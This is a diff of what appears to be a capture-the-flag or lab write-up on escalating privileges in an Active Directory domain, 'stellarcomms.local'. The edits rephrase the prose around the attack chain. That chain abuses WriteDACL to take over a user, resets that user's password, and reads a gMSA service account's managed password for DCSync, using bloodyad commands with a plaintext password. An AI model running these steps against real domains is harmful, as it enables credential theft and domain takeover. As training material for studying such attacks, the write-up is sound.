@@ -236,7 +236,7 @@ The ENG.payload user has Read GMSAPassword over the machine , which means Game o
 
 Now the goal once again here is pretty clear : 
 
-Use  Write DACL over the Eng.payload user to grant ourselves GenericAll rights over the user --> Change that user's password --> Use the ENG.payload user to read the GSMA Password for a service that can perform DCsync . 
+Use  Write DACL over the Eng.payload user to grant ourselves GenericAll rights over the user --> Change that user's password --> Use the ENG.payload user to read the GSMA Password for that service (Luckily for us this service account can perform DCSync) .
 
 ```bash
 ==> Give Astro Genric all rights over Eng.payload : 
@@ -252,7 +252,7 @@ Perfect now to read the GMSA password (GMSA account is an AD account that handle
 ```bash
 bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'eng.payload' -p 'WEAK123.' get object 'SERVICEACCOUNT$' --attr msDS-ManagedPassword
 ```
-Now either we look for a service that can perform DCSync and use BloodyAD , or simply use nxc and it will dump all service accounts . 
+Now either we can use BloodyAD , or simply use nxc and it will dump the service account Hash . 
 
 ```bash
 bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'eng.payload' -p 'WEAK123.' get object 'SATLINK-SERVICE$' --attr msDS-ManagedPassword
